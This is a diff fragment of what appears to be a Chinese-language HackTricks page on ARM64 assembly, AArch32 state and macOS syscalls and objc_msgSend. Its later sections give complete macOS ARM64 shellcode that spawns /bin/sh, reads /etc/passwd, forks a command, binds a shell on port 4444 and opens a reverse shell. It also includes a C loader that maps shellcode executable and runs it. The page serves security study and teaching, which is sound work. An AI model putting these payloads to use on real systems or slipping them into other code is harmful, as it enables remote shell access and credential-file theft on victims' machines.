+<li><strong><code>b.&lt;cond&gt;</code></strong>：条件分支。</li>
+<li><strong><code>b.eq</code></strong>：<strong>如果相等则分支</strong>，基于先前的 <code>cmp</code> 指令。</li>
+<li>示例：<code>b.eq label</code> — 如果先前的 <code>cmp</code> 指令发现两个值相等，则跳转到 <code>label</code>。</li>
+<li><strong><code>b.ne</code></strong>：<strong>如果不相等则分支</strong>。此指令检查条件标志（由先前的比较指令设置），如果比较的值不相等，则分支到标签或地址。</li>
+<li>示例：在 <code>cmp x0, x1</code> 指令之后，<code>b.ne label</code> — 如果 <code>x0</code> 和 <code>x1</code> 中的值不相等，则跳转到 <code>label</code>。</li>
+<li><strong><code>cbz</code></strong>：<strong>比较并在零时分支</strong>。此指令将寄存器与零进行比较，如果相等，则分支到标签或地址。</li>
+<li>示例：<code>cbz x0, label</code> — 如果 <code>x0</code> 中的值为零，则跳转到 <code>label</code>。</li>
+<li><strong><code>cbnz</code></strong>：<strong>比较并在非零时分支</strong>。此指令将寄存器与零进行比较，如果不相等，则分支到标签或地址。</li>
+<li>示例：<code>cbnz x0, label</code> — 如果 <code>x0</code> 中的值非零，则跳转到 <code>label</code>。</li>
+<li><strong><code>tbnz</code></strong>：测试位并在非零时分支。</li>
+<li>示例：<code>tbnz x0, #8, label</code>。</li>
+<li><strong><code>tbz</code></strong>：测试位并在零时分支。</li>
+<li>示例：<code>tbz x0, #8, label</code>。</li>
+<li><strong>条件选择操作</strong>：这些操作的行为取决于条件位。</li>
+<li><code>csel Xd, Xn, Xm, cond</code> -&gt; <code>csel X0, X1, X2, EQ</code> -&gt; 如果为真，X0 = X1，如果为假，X0 = X2。</li>
+<li><code>csinc Xd, Xn, Xm, cond</code> -&gt; 如果为真，Xd = Xn，如果为假，Xd = Xm + 1。</li>
+<li><code>cinc Xd, Xn, cond</code> -&gt; 如果为真，Xd = Xn + 1，如果为假，Xd = Xn。</li>
+<li><code>csinv Xd, Xn, Xm, cond</code> -&gt; 如果为真，Xd = Xn，如果为假，Xd = NOT(Xm)。</li>
+<li><code>cinv Xd, Xn, cond</code> -&gt; 如果为真，Xd = NOT(Xn)，如果为假，Xd = Xn。</li>
+<li><code>csneg Xd, Xn, Xm, cond</code> -&gt; 如果为真，Xd = Xn，如果为假，Xd = - Xm。</li>
+<li><code>cneg Xd, Xn, cond</code> -&gt; 如果为真，Xd = - Xn，如果为假，Xd = Xn。</li>
+<li><code>cset Xd, Xn, Xm, cond</code> -&gt; 如果为真，Xd = 1，如果为假，Xd = 0。</li>
+<li><code>csetm Xd, Xn, Xm, cond</code> -&gt; 如果为真，Xd = &lt;全 1&gt;，如果为假，Xd = 0。</li>
+<li><strong><code>adrp</code></strong>：计算 <strong>符号的页地址</strong> 并将其存储在寄存器中。</li>
+<li>示例：<code>adrp x0, symbol</code> — 这计算 <code>symbol</code> 的页地址并将其存储在 <code>x0</code> 中。</li>
+<li><strong><code>ldrsw</code></strong>：<strong>加载</strong>一个有符号 <strong>32 位</strong> 值从内存并 <strong>符号扩展到 64</strong> 位。</li>
+<li>示例：<code>ldrsw x0, [x1]</code> — 这将从 <code>x1</code> 指向的内存位置加载一个有符号 32 位值，符号扩展到 64 位，并存储在 <code>x0</code> 中。</li>
+<li><strong><code>stur</code></strong>：<strong>将寄存器值存储到内存位置</strong>，使用来自另一个寄存器的偏移。</li>
+<li>示例：<code>stur x0, [x1, #4]</code> — 这将值存储在 <code>x0</code> 中到比当前在 <code>x1</code> 中的地址大 4 字节的内存地址。</li>
+<li><strong><code>svc</code></strong> : 进行 <strong>系统调用</strong>。它代表“监督调用”。当处理器执行此指令时，它 <strong>从用户模式切换到内核模式</strong> 并跳转到内存中 <strong>内核的系统调用处理</strong> 代码所在的特定位置。</li>
+<li>示例：</li>
+</ul>
+<pre><code class="language-armasm">mov x8, 93  ; 将退出的系统调用号（93）加载到寄存器 x8 中。
+mov x0, 0   ; 将退出状态代码（0）加载到寄存器 x0 中。
+svc 0       ; 进行系统调用。
+</code></pre>
+<h3 id="函数序言"><a class="header" href="#函数序言"><strong>函数序言</strong></a></h3>
+<ol>
+<li><strong>将链接寄存器和帧指针保存到堆栈</strong>：</li>
+</ol>
+<pre><code class="language-armasm">stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
+</code></pre>
+<p>{% endcode %}</p>
+<ol start="2">
+<li><strong>设置新的帧指针</strong>: <code>mov x29, sp</code> (为当前函数设置新的帧指针)</li>
+<li><strong>在栈上为局部变量分配空间（如果需要）</strong>: <code>sub sp, sp, &lt;size&gt;</code> (其中 <code>&lt;size&gt;</code> 是所需的字节数)</li>
+</ol>
+<h3 id="函数尾声"><a class="header" href="#函数尾声"><strong>函数尾声</strong></a></h3>
+<ol>
+<li><strong>释放局部变量（如果有分配的话）</strong>: <code>add sp, sp, &lt;size&gt;</code></li>
+<li><strong>恢复链接寄存器和帧指针</strong>:</li>
+</ol>
+<p>{% code overflow="wrap" %}</p>
+<pre><code class="language-armasm">ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
+</code></pre>
+<p>{% endcode %}</p>
+<ol start="3">
+<li><strong>返回</strong>: <code>ret</code>（使用链接寄存器中的地址将控制权返回给调用者）</li>
+</ol>
+<h2 id="aarch32-执行状态"><a class="header" href="#aarch32-执行状态">AARCH32 执行状态</a></h2>
+<p>Armv8-A 支持执行 32 位程序。<strong>AArch32</strong> 可以在 <strong>两种指令集</strong> 中运行：<strong><code>A32</code></strong> 和 <strong><code>T32</code></strong>，并可以通过 <strong><code>互操作</code></strong> 在它们之间切换。<br />
+<strong>特权</strong> 64 位程序可以通过执行异常级别转移到较低特权的 32 位程序来调度 <strong>32 位</strong> 程序的执行。<br />
+请注意，从 64 位到 32 位的过渡发生在异常级别降低时（例如，EL1 中的 64 位程序触发 EL0 中的程序）。这是通过在 <code>AArch32</code> 进程线程准备执行时将 <strong><code>SPSR_ELx</code></strong> 特殊寄存器的 <strong>第 4 位</strong> 设置为 <strong>1</strong> 来完成的，其余的 <code>SPSR_ELx</code> 存储 <strong><code>AArch32</code></strong> 程序的 CPSR。然后，特权进程调用 <strong><code>ERET</code></strong> 指令，以便处理器过渡到 <strong><code>AArch32</code></strong>，根据 CPSR 进入 A32 或 T32。**</p>
+<p><strong><code>互操作</code></strong> 通过 CPSR 的 J 和 T 位发生。<code>J=0</code> 和 <code>T=0</code> 表示 <strong><code>A32</code></strong>，而 <code>J=0</code> 和 <code>T=1</code> 表示 <strong>T32</strong>。这基本上意味着将 <strong>最低位设置为 1</strong> 以指示指令集为 T32。<br />
+这在 <strong>互操作分支指令</strong> 中设置，但也可以在 PC 设置为目标寄存器时通过其他指令直接设置。示例：</p>
+<p>另一个示例：</p>
+<pre><code class="language-armasm">_start:
+.code 32                ; Begin using A32
+add r4, pc, #1      ; Here PC is already pointing to "mov r0, #0"
+bx r4               ; Swap to T32 mode: Jump to "mov r0, #0" + 1 (so T32)
+
+.code 16:
+mov r0, #0
+mov r0, #8
+</code></pre>
+<h3 id="寄存器"><a class="header" href="#寄存器">寄存器</a></h3>
+<p>有16个32位寄存器（r0-r15）。<strong>从r0到r14</strong>可以用于<strong>任何操作</strong>，但是其中一些通常是保留的：</p>
+<ul>
+<li><strong><code>r15</code></strong>：程序计数器（始终）。包含下一条指令的地址。在A32中为当前 + 8，在T32中为当前 + 4。</li>
+<li><strong><code>r11</code></strong>：帧指针</li>
+<li><strong><code>r12</code></strong>：过程内调用寄存器</li>
+<li><strong><code>r13</code></strong>：栈指针</li>
+<li><strong><code>r14</code></strong>：链接寄存器</li>
+</ul>
+<p>此外，寄存器在**<code>银行寄存器</code><strong>中备份。这些是存储寄存器值的地方，允许在异常处理和特权操作中执行</strong>快速上下文切换**，以避免每次都手动保存和恢复寄存器。<br />
+这是通过**将处理器状态从<code>CPSR</code>保存到处理器模式的<code>SPSR</code><strong>来完成的。在异常返回时，</strong><code>CPSR</code><strong>从</strong><code>SPSR</code>**恢复。</p>
+<h3 id="cpsr---当前程序状态寄存器"><a class="header" href="#cpsr---当前程序状态寄存器">CPSR - 当前程序状态寄存器</a></h3>
+<p>在AArch32中，CPSR的工作方式类似于**<code>PSTATE</code><strong>在AArch64中，并且在发生异常时也存储在</strong><code>SPSR_ELx</code>**中，以便稍后恢复执行：</p>
+<figure><img src="../../../.gitbook/assets/image (1197).png" alt=""><figcaption></figcaption></figure>
+<p>字段分为几个组：</p>
+<ul>
+<li>应用程序状态寄存器（APSR）：算术标志，并可从EL0访问</li>
+<li>执行状态寄存器：进程行为（由操作系统管理）。</li>
+</ul>
+<h4 id="应用程序状态寄存器apsr"><a class="header" href="#应用程序状态寄存器apsr">应用程序状态寄存器（APSR）</a></h4>
+<ul>
+<li><strong><code>N</code></strong>、<strong><code>Z</code></strong>、<strong><code>C</code></strong>、<strong><code>V</code></strong> 标志（与AArch64相同）</li>
+<li><strong><code>Q</code></strong> 标志：在执行专用饱和算术指令期间，每当<strong>整数饱和发生</strong>时设置为1。一旦设置为**<code>1</code>**，它将保持该值，直到手动设置为0。此外，没有任何指令隐式检查其值，必须手动读取。</li>
+<li><strong><code>GE</code></strong>（大于或等于）标志：用于SIMD（单指令，多数据）操作，例如“并行加法”和“并行减法”。这些操作允许在单个指令中处理多个数据点。</li>
+</ul>
+<p>例如，<strong><code>UADD8</code></strong> 指令<strong>并行添加四对字节</strong>（来自两个32位操作数），并将结果存储在32位寄存器中。然后<strong>根据这些结果设置<code>GE</code>标志在<code>APSR</code>中</strong>。每个GE标志对应于一个字节加法，指示该字节对的加法是否<strong>溢出</strong>。</p>
+<p><strong><code>SEL</code></strong> 指令使用这些GE标志执行条件操作。</p>
+<h4 id="执行状态寄存器"><a class="header" href="#执行状态寄存器">执行状态寄存器</a></h4>
+<ul>
+<li><strong><code>J</code></strong> 和 <strong><code>T</code></strong> 位：<strong><code>J</code></strong> 应为0，如果 <strong><code>T</code></strong> 为0，则使用指令集A32，如果为1，则使用T32。</li>
+<li><strong>IT块状态寄存器</strong>（<code>ITSTATE</code>）：这些是从10-15和25-26的位。它们存储**<code>IT</code>**前缀组内指令的条件。</li>
+<li><strong><code>E</code></strong> 位：指示<strong>字节序</strong>。</li>
+<li><strong>模式和异常掩码位</strong>（0-4）：它们确定当前执行状态。<strong>第5位</strong>指示程序以32位（1）或64位（0）运行。其他4位表示<strong>当前使用的异常模式</strong>（当发生异常并正在处理时）。设置的数字<strong>指示当前优先级</strong>，以防在处理此异常时触发另一个异常。</li>
+</ul>
+<figure><img src="../../../.gitbook/assets/image (1200).png" alt=""><figcaption></figcaption></figure>
+<ul>
+<li><strong><code>AIF</code></strong>：某些异常可以使用位**<code>A</code><strong>、<code>I</code>、<code>F</code>禁用。如果</strong><code>A</code><strong>为1，则表示将触发</strong>异步中止**。<strong><code>I</code><strong>配置为响应外部硬件</strong>中断请求</strong>（IRQ）。F与<strong>快速中断请求</strong>（FIR）相关。</li>
+</ul>
+<h2 id="macos"><a class="header" href="#macos">macOS</a></h2>
+<h3 id="bsd系统调用"><a class="header" href="#bsd系统调用">BSD系统调用</a></h3>
+<p>查看<a href="https://opensource.apple.com/source/xnu/xnu-1504.3.12/bsd/kern/syscalls.master"><strong>syscalls.master</strong></a>。BSD系统调用将具有<strong>x16 &gt; 0</strong>。</p>
+<h3 id="mach陷阱"><a class="header" href="#mach陷阱">Mach陷阱</a></h3>
+<p>查看<a href="https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html"><strong>syscall_sw.c</strong></a>中的<code>mach_trap_table</code>，以及在<a href="https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h"><strong>mach_traps.h</strong></a>中的原型。Mach陷阱的最大数量为<code>MACH_TRAP_TABLE_COUNT</code> = 128。Mach陷阱将具有<strong>x16 &lt; 0</strong>，因此您需要用<strong>负号</strong>调用前一个列表中的数字：<strong><code>_kernelrpc_mach_vm_allocate_trap</code><strong>是</strong><code>-10</code></strong>。</p>
+<p>您还可以在反汇编器中检查**<code>libsystem_kernel.dylib</code>**以找到如何调用这些（和BSD）系统调用：</p>
+<pre><code class="language-bash"># macOS
+dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
+
+# iOS
+dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
+</code></pre>
+<p>{% endcode %}</p>
+<p>注意，<strong>Ida</strong> 和 <strong>Ghidra</strong> 也可以通过传递缓存来反编译 <strong>特定的 dylibs</strong>。</p>
+<p>{% hint style="success" %}
+有时检查 <strong><code>libsystem_kernel.dylib</code></strong> 的 <strong>反编译</strong> 代码比检查 <strong>源代码</strong> 更容易，因为几个系统调用（BSD 和 Mach）的代码是通过脚本生成的（查看源代码中的注释），而在 dylib 中你可以找到被调用的内容。
+{% endhint %}</p>
+<h3 id="machdep-调用"><a class="header" href="#machdep-调用">machdep 调用</a></h3>
+<p>XNU 支持另一种称为机器依赖的调用。这些调用的数量取决于架构，且调用或数量都不保证保持不变。</p>
+<h3 id="comm-页面"><a class="header" href="#comm-页面">comm 页面</a></h3>
+<p>这是一个内核拥有的内存页面，映射到每个用户进程的地址空间中。它旨在使从用户模式到内核空间的转换比使用系统调用更快，因为这些内核服务的使用频率很高，这样的转换会非常低效。</p>
+<p>例如，调用 <code>gettimeofdate</code> 直接从 comm 页面读取 <code>timeval</code> 的值。</p>
+<h3 id="objc_msgsend"><a class="header" href="#objc_msgsend">objc_msgSend</a></h3>
+<p>在 Objective-C 或 Swift 程序中，找到这个函数是非常常见的。这个函数允许调用一个 Objective-C 对象的方法。</p>
+<p>参数（<a href="https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend">文档中更多信息</a>）：</p>
+<ul>
+<li>x0: self -&gt; 指向实例的指针</li>
+<li>x1: op -&gt; 方法的选择器</li>
+<li>x2... -&gt; 被调用方法的其余参数</li>
+</ul>
+<p>因此，如果在调用此函数的分支之前设置断点，你可以很容易地在 lldb 中找到被调用的内容（在这个例子中，对象调用了一个来自 <code>NSConcreteTask</code> 的对象，该对象将运行一个命令）：</p>
+<pre><code class="language-bash"># Right in the line were objc_msgSend will be called
+(lldb) po $x0
+&lt;NSConcreteTask: 0x1052308e0&gt;
+
+(lldb) x/s $x1
+0x1736d3a6e: "launch"
+
+(lldb) po [$x0 launchPath]
+/bin/sh
+
+(lldb) po [$x0 arguments]
+&lt;__NSArrayI 0x1736801e0&gt;(
+-c,
+whoami
+)
+</code></pre>
+<p>{% hint style="success" %}
+设置环境变量 <strong><code>NSObjCMessageLoggingEnabled=1</code></strong> 可以记录此函数在文件 <code>/tmp/msgSends-pid</code> 中被调用的情况。</p>
+<p>此外，设置 <strong><code>OBJC_HELP=1</code></strong> 并调用任何二进制文件，您可以看到其他环境变量，您可以使用这些变量来 <strong>log</strong> 某些 Objc-C 操作发生时的情况。
+{% endhint %}</p>
+<p>当调用此函数时，需要找到所指实例的调用方法，为此进行不同的搜索：</p>
+<ul>
+<li>执行乐观缓存查找：</li>
+<li>如果成功，完成</li>
+<li>获取 runtimeLock（读取）</li>
+<li>如果 (realize &amp;&amp; !cls-&gt;realized) 实现类</li>
+<li>如果 (initialize &amp;&amp; !cls-&gt;initialized) 初始化类</li>
+<li>尝试类自己的缓存：</li>
+<li>如果成功，完成</li>
+<li>尝试类方法列表：</li>
+<li>如果找到，填充缓存并完成</li>
+<li>尝试超类缓存：</li>
+<li>如果成功，完成</li>
+<li>尝试超类方法列表：</li>
+<li>如果找到，填充缓存并完成</li>
+<li>如果 (resolver) 尝试方法解析器，并从类查找重复</li>
+<li>如果仍然在这里（= 所有其他都失败了）尝试转发器</li>
+</ul>
+<h3 id="shellcodes"><a class="header" href="#shellcodes">Shellcodes</a></h3>
+<p>编译：</p>
+<pre><code class="language-bash">as -o shell.o shell.s
+ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib
+
+# You could also use this
+ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
+</code></pre>
+<p>提取字节：</p>
+<pre><code class="language-bash"># Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
+for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
+echo -n '\\x'$c
+done
+</code></pre>
+<p>对于较新的 macOS：</p>
+<pre><code class="language-bash"># Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
+for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
+echo -n $s | awk '{for (i = 7; i &gt; 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
+done
+</code></pre>
+<details>
+<summary>测试 shellcode 的 C 代码</summary>
+```c
+// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
+// gcc loader.c -o loader
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+<p>int (*sc)();</p>
+<p>char shellcode[] = "<INSERT SHELLCODE HERE>";</p>
+<p>int main(int argc, char **argv) {
+printf("[&gt;] Shellcode Length: %zd Bytes\n", strlen(shellcode));</p>
+<p>void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);</p>
+<p>if (ptr == MAP_FAILED) {
+perror("mmap");
+exit(-1);
+}
+printf("[+] SUCCESS: mmap\n");
+printf("    |-&gt; Return = %p\n", ptr);</p>
+<p>void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
+printf("[+] SUCCESS: memcpy\n");
+printf("    |-&gt; Return = %p\n", dst);</p>
+<p>int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);</p>
+<p>if (status == -1) {
+perror("mprotect");
+exit(-1);
+}
+printf("[+] SUCCESS: mprotect\n");
+printf("    |-&gt; Return = %d\n", status);</p>
+<p>printf("[&gt;] Trying to execute shellcode...\n");</p>
+<p>sc = ptr;
+sc();</p>
+<p>return 0;
+}</p>
+<pre><code>&lt;/details&gt;
+
+#### Shell
+
+取自[**这里**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s)并进行了解释。
+
+{% tabs %}
+{% tab title="with adr" %}
+```armasm
+.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
+.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
+.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
+
+_main:
+adr  x0, sh_path  ; This is the address of "/bin/sh".
+mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov  x16, #59     ; Move the execve syscall number (59) into x16.
+svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+
+sh_path: .asciz "/bin/sh"
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="带栈" %}</p>
+<pre><code class="language-armasm">.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
+.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
+.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
+
+_main:
+; We are going to build the string "/bin/sh" and place it on the stack.
+
+mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
+movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
+movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
+movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.
+
+str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.
+
+; Prepare arguments for the execve syscall.
+
+mov  x1, #8       ; Set x1 to 8.
+sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
+mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+
+; Make the syscall.
+
+mov  x16, #59     ; Move the execve syscall number (59) into x16.
+svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+
+</code></pre>
+<p>{% endtab %}</p>
+<p>{% tab title="使用 adr 的 Linux" %}</p>
+<pre><code class="language-armasm">; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
+.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
+.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
+.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).
+
+_main:
+adr  x0, sh_path  ; This is the address of "/bin/sh".
+mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
+mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
+mov  x16, #59     ; Move the execve syscall number (59) into x16.
+svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.
+
+sh_path: .asciz "/bin/sh"
+</code></pre>
+<p>{% endtab %}
+{% endtabs %}</p>
+<h4 id="使用-cat-读取"><a class="header" href="#使用-cat-读取">使用 cat 读取</a></h4>
+<p>目标是执行 <code>execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)</code>，因此第二个参数 (x1) 是一个参数数组（在内存中这意味着一堆地址）。</p>
+<pre><code class="language-armasm">.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
+.global _main              ; Declare a global symbol _main
+.align 2                   ; Align the beginning of the following code to a 4-byte boundary
+
+_main:
+; Prepare the arguments for the execve syscall
+sub sp, sp, #48        ; Allocate space on the stack
+mov x1, sp             ; x1 will hold the address of the argument array
+adr x0, cat_path
+str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
+adr x0, passwd_path    ; Get the address of "/etc/passwd"
+str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
+str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)
+
+adr x0, cat_path
+mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
+mov x16, #59           ; Load the syscall number for execve (59) into x8
+svc 0                  ; Make the syscall
+
+
+cat_path: .asciz "/bin/cat"
+.align 2
+passwd_path: .asciz "/etc/passwd"
+</code></pre>
+<h4 id="从一个分叉中使用-sh-调用命令以便主进程不会被终止"><a class="header" href="#从一个分叉中使用-sh-调用命令以便主进程不会被终止">从一个分叉中使用 sh 调用命令，以便主进程不会被终止</a></h4>
+<pre><code class="language-armasm">.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
+.global _main              ; Declare a global symbol _main
+.align 2                   ; Align the beginning of the following code to a 4-byte boundary
+
+_main:
+; Prepare the arguments for the fork syscall
+mov x16, #2            ; Load the syscall number for fork (2) into x8
+svc 0                  ; Make the syscall
+cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
+beq _loop              ; If not child process, loop
+
+; Prepare the arguments for the execve syscall
+
+sub sp, sp, #64        ; Allocate space on the stack
+mov x1, sp             ; x1 will hold the address of the argument array
+adr x0, sh_path
+str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
+adr x0, sh_c_option    ; Get the address of "-c"
+str x0, [x1, #8]       ; Store the address of "-c" as the second argument
+adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
+str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
+str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
+
+adr x0, sh_path
+mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
+mov x16, #59           ; Load the syscall number for execve (59) into x8
+svc 0                  ; Make the syscall
+
+
+_exit:
+mov x16, #1            ; Load the syscall number for exit (1) into x8
+mov x0, #0             ; Set exit status code to 0
+svc 0                  ; Make the syscall
+
+_loop: b _loop
+
+sh_path: .asciz "/bin/sh"
+.align 2
+sh_c_option: .asciz "-c"
+.align 2
+touch_command: .asciz "touch /tmp/lalala"
+</code></pre>
+<h4 id="bind-shell"><a class="header" href="#bind-shell">Bind shell</a></h4>
+<p>来自 <a href="https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s">https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s</a> 的 Bind shell 在 <strong>port 4444</strong></p>
+<pre><code class="language-armasm">.section __TEXT,__text
+.global _main
+.align 2
+_main:
+call_socket:
+// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
+mov  x16, #97
+lsr  x1, x16, #6
+lsl  x0, x1, #1
+mov  x2, xzr
+svc  #0x1337
+
+// save s
+mvn  x3, x0
+
+call_bind:
+/*
+* bind(s, &amp;sockaddr, 0x10)
+*
+* struct sockaddr_in {
+*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
+*     sa_family_t     sin_family;  // AF_INET = 2
+*     in_port_t       sin_port;    // 4444 = 0x115C
+*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
+*     char            sin_zero[8]; // Don't care
+* };
+*/
+mov  x1, #0x0210
+movk x1, #0x5C11, lsl #16
+str  x1, [sp, #-8]
+mov  x2, #8
+sub  x1, sp, x2
+mov  x2, #16
+mov  x16, #104
+svc  #0x1337
+
+call_listen:
+// listen(s, 2)
+mvn  x0, x3
+lsr  x1, x2, #3
+mov  x16, #106
+svc  #0x1337
+
+call_accept:
+// c = accept(s, 0, 0)
+mvn  x0, x3
+mov  x1, xzr
+mov  x2, xzr
+mov  x16, #30
+svc  #0x1337
+
+mvn  x3, x0
+lsr  x2, x16, #4
+lsl  x2, x2, #2
+
+call_dup:
+// dup(c, 2) -&gt; dup(c, 1) -&gt; dup(c, 0)
+mvn  x0, x3
+lsr  x2, x2, #1
+mov  x1, x2
+mov  x16, #90
+svc  #0x1337
+mov  x10, xzr
+cmp  x10, x2
+bne  call_dup
+
+call_execve:
+// execve("/bin/sh", 0, 0)
+mov  x1, #0x622F
+movk x1, #0x6E69, lsl #16
+movk x1, #0x732F, lsl #32
+movk x1, #0x68, lsl #48
+str  x1, [sp, #-8]
+mov	 x1, #8
+sub  x0, sp, x1
+mov  x1, xzr
+mov  x2, xzr
+mov  x16, #59
+svc  #0x1337
+</code></pre>
+<h4 id="反向-shell"><a class="header" href="#反向-shell">反向 shell</a></h4>
+<p>来自 <a href="https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s">https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s</a>，revshell 到 <strong>127.0.0.1:4444</strong></p>
+<pre><code class="language-armasm">.section __TEXT,__text
+.global _main
+.align 2
+_main:
+call_socket:
+// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
+mov  x16, #97
+lsr  x1, x16, #6
+lsl  x0, x1, #1
+mov  x2, xzr
+svc  #0x1337
+
+// save s
+mvn  x3, x0
+
+call_connect:
+/*
+* connect(s, &amp;sockaddr, 0x10)
+*
+* struct sockaddr_in {
+*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
+*     sa_family_t     sin_family;  // AF_INET = 2
+*     in_port_t       sin_port;    // 4444 = 0x115C
+*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
+*     char            sin_zero[8]; // Don't care
+* };
+*/
+mov  x1, #0x0210
+movk x1, #0x5C11, lsl #16
+movk x1, #0x007F, lsl #32
+movk x1, #0x0100, lsl #48
+str  x1, [sp, #-8]
+mov  x2, #8
+sub  x1, sp, x2
+mov  x2, #16
+mov  x16, #98
+svc  #0x1337
+
+lsr  x2, x2, #2
+
+call_dup:
+// dup(s, 2) -&gt; dup(s, 1) -&gt; dup(s, 0)
+mvn  x0, x3
+lsr  x2, x2, #1
+mov  x1, x2
+mov  x16, #90
+svc  #0x1337
+mov  x10, xzr
+cmp  x10, x2
+bne  call_dup
+
+call_execve:
+// execve("/bin/sh", 0, 0)
+mov  x1, #0x622F
+movk x1, #0x6E69, lsl #16
+movk x1, #0x732F, lsl #32
+movk x1, #0x68, lsl #48
+str  x1, [sp, #-8]
+mov	 x1, #8
+sub  x0, sp, x1
+mov  x1, xzr
+mov  x2, xzr
+mov  x16, #59
+svc  #0x1337
+</code></pre>
+<p>{% hint style="success" %}
+学习与实践 AWS 黑客技术：<img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="../../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习与实践 GCP 黑客技术：<img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="../../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
